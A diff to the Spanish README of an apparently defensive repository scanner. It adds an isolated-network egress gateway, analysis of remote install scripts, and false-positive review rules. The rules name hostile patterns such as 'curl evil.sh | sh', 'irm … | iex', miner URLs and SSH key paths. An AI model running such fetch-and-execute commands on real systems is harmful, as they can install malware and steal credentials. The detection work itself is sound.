@@ -102,6 +102,8 @@ scripts/local.sh rebuild    # reconstruir sin caché (por ejemplo, tras actualiz
 
 El contenedor (`compose.yaml`) corre con tu usuario, con el sistema de ficheros en solo lectura y sin capacidades de Linux, no puede escalar privilegios y tiene límites de memoria (2 GB), CPU (2) y procesos (256). Solo escribe en la carpeta de clones y en `/tmp`.
 
+**Red aislada.** La app vive en una red interna de Docker sin salida a ninguna parte. Su única conexión con el exterior es un segundo contenedor mínimo, la pasarela (`lib/gateway.js`, sin dependencias): reenvía lo que abres en el navegador y hace de proxy de salida para la app, git, Semgrep y Trivy. Solo deja pasar HTTPS (puerto 443) hacia direcciones públicas, comprobando la IP al conectar: ni tu equipo, ni tu red local, ni el servicio de metadatos de la nube son alcanzables, aunque un dominio resuelva a ellos. Cada intento bloqueado queda en `docker compose logs gateway`. La pasarela corre como `nobody`, en solo lectura, sin capacidades y con 128 MB.
+
 Para usar la imagen ya publicada en lugar de construirla:
 
 ```bash
@@ -275,6 +277,24 @@ Lo que no está en el código que descargas, pero te afecta igual:
 - **Vulnerabilidades del propio proyecto.** Se consulta en OSV.dev el commit analizado y el paquete del proyecto (nombre y versión).
 - **Dependencias indirectas sin lockfile.** Si un `package.json` no trae `package-lock.json` ni `yarn.lock`, solo se conocen las dependencias directas, pero `npm install` instalaría también las de esas. [deps.dev](https://deps.dev) resuelve el árbol que saldría hoy (la versión más alta que cumple cada rango) y todo se consulta en OSV.dev. De momento solo npm.
 - **¿Se está explotando?** Las CVE de cada aviso se cruzan con el [catálogo KEV de CISA](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) (vulnerabilidades que se están explotando ya: sube la gravedad a alta como mínimo) y con [EPSS](https://www.first.org/epss/) (probabilidad de explotación en los próximos 30 días). Solo pueden subir la gravedad, nunca bajarla.
+- **Scripts que el repo manda ejecutar.** Si el README, un script o la CI dicen `curl … | sh`, `irm … | iex` o "bájalo y ejecútalo", el servidor local descarga ese script **como datos, sin ejecutarlo** (solo HTTPS, como mucho 1 MB, nunca desde tu red local) y cuenta qué hace: a qué dominios va, si comprueba checksums o firmas, si pide `sudo`, si toca tu PATH, tu perfil o el registro, si se programa para arrancar solo, si borra carpetas con rutas peligrosas, si ofusca código, si lee credenciales o si envía datos fuera. Si hace algo malicioso, el aviso sube a crítico; si no, baja, porque sigue siendo código ajeno sin verificar pero no un ataque. Se pide con el User-Agent de curl, que es como lo pediría quien siga las instrucciones; un servidor puede servir otra cosa más adelante, y el aviso guarda el sha256 de lo que se revisó. En la versión web no se descargan (el navegador no puede pedir a cualquier dominio) y la cobertura lo dice.
+
+### Revisión de falsos positivos
+
+Las reglas buscan formas de código peligrosas, y esas formas también aparecen en código inofensivo. Antes de decidir el veredicto, cada aviso se revisa con lo que lo rodea, y si cambia de gravedad la descripción dice por qué. Nada desaparece:
+
+- **Datos de prueba.** Un `curl evil.sh | sh` o un `stratum+tcp://` dentro de una cadena en un test, sin nada cerca que la ejecute (`exec`, `subprocess`, `eval`…), es un dato: baja a baja. Si hay algo que lo ejecuta, no baja.
+- **Código de terceros** copiado en el repo (`vendor/`, `third_party/`, `*.min.js`, el Yarn de `.yarn/releases`): los patrones de forma (`eval(unescape())`, líneas larguísimas, arrays de números) bajan; lo malicioso por su contenido (mineros, robo de credenciales, shells inversas) no.
+- **Instrucciones de la documentación** frente a scripts que se ejecutan solos, y el contenido real del script remoto (ver arriba).
+- **Typosquatting.** Un paquete con nombre parecido a otro popular que existe desde hace años (fecha de la primera versión en deps.dev) no es un typosquat.
+- **Dependencias de desarrollo, de la web de documentación o de los ejemplos:** sus vulnerabilidades bajan un nivel porque no llegan a quien usa el proyecto. Un paquete **malicioso** no baja nunca: `npm install` también instala las de desarrollo.
+- **IP de documentación, privadas o locales**, alfabetos mezclados en ficheros de traducción, ejemplos de código dentro de los `.md` y claves públicas de búsqueda de Algolia DocSearch.
+- **Comentarios**, según el lenguaje de cada fichero: en JavaScript `#campo = …` es un campo privado y `* 2; …` sigue una multiplicación, así que esas líneas no se dan por comentario. Tampoco una línea que puede cerrar una cadena de varias líneas (una plantilla de JS, un `"""` de Python o una línea anterior acabada en `\`).
+- **Rutas de ejemplo** (`~/.ssh/id_ed25519` en un placeholder o en la documentación de la API) y **textos** que mencionan una técnica (la clave `Run` del registro en una traducción), solo si el fichero no ejecuta comandos ni envía datos.
+
+**¿A quién afecta?** La herramienta protege a quien clona el repo, no al autor. Cada aviso dice cuándo te afectaría: *al abrir el repo*, *al instalar*, *al ejecutarlo*, *si copias el comando*, *solo al desplegarlo*, *solo su web de docs* o *solo al autor*. Lo de las tres últimas baja a baja o informativo: las claves que el autor dejó en el repo son su problema (a ti solo te importa si usas el proyecto con ese valor), su CI corre en sus servidores, Kubernetes o Helm solo cuentan si lo despliegas, y un fallo en su web de documentación afecta a quien la visita. En la página, el filtro "Lo que te afecta" los oculta (con un aviso de cuántos hay) y "Todo" los enseña; se combina con los filtros de tipo (vulnerabilidades o amenazas) y de si se pueden arreglar, y los avisos de una misma regla van juntos en un bloque plegable.
+
+Se ha comprobado con más de 40 repos reales y conocidos (Express, lodash, axios, requests, Flask, ripgrep, rustup, nvm…) y con repos trampa con malware plantado; los tests comprueban las dos cosas: que lo inofensivo baja y que lo que se ejecuta de verdad no.
 
 ## Vigilancia de tus clones
 
